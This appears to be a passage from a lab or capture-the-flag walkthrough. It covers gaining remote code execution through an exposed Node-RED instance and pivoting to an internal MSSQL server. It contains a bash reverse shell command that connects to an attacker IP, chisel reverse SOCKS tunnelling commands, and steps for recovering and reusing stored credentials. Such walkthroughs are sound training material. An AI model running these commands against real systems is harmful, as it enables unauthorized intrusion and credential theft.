Both windows hosts had only RDP service enabled, on linux hosts, there was something hosted on port 1880 which on googling shows it runs Node-RED, which is a flow based development tool for visual programming used in IoT devices

Node-RED is known for getting remote command execution (RCE), to achieve this, we'll need to create a flow by timestamp block following exec block

Replacing the curl command with bash reverse shell

<img src="https://i.imgur.com/HCcZ8G6.png"/>

```bash
bash -i >& /dev/tcp/10.8.0.136/2222 0>&1
```

After having the shell, it can be stabilized with python3 to use it as a normal shell

From `nodered` directory, we can find some type of hashed password but not really sure who this belongs to and how this can be cracked

From sql node properties, we can see the connection string with the username `nodered_connector`

<img src="https://i.imgur.com/DI5KPTP.png"/>

So there's a script to decrypt the node-red credentials, which needs `flows_cred.json` and  `.config.runtime.json`

In order to connect to MSSQL, we'll need to performing pivoting since that service isn't exposed we'll use chisel socks proxy

```bash
chisel server --reverse -p 3000
chisel client 10.8.0.136:3000 R:socks
```

With this, we'll be able to reach port 1433 on sql.tengu.vl

Trying to enable `xp_cmdshell` resulted in no luck as this user didn't had privileged in mssql

Enumerating the databases, there are two, which are not available by default, `Dev` and `Demo`

<img src="https://i.imgur.com/5fPlFgo.png"/>

Dev didn't had anything interesting while there was one set of credential from Demo
